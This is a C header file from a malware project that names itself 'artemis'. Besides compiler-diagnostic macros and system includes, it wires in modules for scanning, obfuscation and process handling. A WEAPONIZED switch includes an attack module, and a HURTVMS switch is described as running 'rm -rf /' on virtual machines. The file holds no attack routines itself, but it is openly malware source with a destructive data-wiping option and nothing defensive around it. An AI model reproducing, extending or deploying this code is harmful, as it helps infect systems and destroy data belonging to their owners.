#pragma once

// Thanks https://clang.llvm.org/docs/UsersManual.html
#define STR(X) #X
#define DEFER(M, ...) M(__VA_ARGS__)
#define clang_err(X) _Pragma(STR(GCC error(X " at line " DEFER(STR, __LINE__))))
#define clang_wrn(X) _Pragma(STR(GCC warning(X " at line " DEFER(STR, __LINE__))))
#define clang_msg(X) _Pragma(STR(message(X " at line " DEFER(STR, __LINE__))))
#define clang_ignore(X) _Pragma("clang diagnostic push") \
                        _Pragma(STR(clang diagnostic ignored X))
#define clang_pop() _Pragma("clang diagnostic pop")
#define inline_force __attribute__((always_inline))

#define _GNU_SOURCE

#undef WEAPONIZED // Includes attk.c
#undef HURTVMS // runs "rm -rf /" on vms

#define MAIN_VERSION "1.0"
#define MAIN_NAME "artemis\0" // Malware name when observeed

#include <arpa/inet.h>
#include <ctype.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#include "func.h"
#include "comm.h"
#include "debug.h"
#include "ipv4.h"
#include "obfsc.h"
#include "process.h"
#include "rand.h"
#include "scan.h"

#ifdef WEAPONIZED
#include "attk.h"
#endif
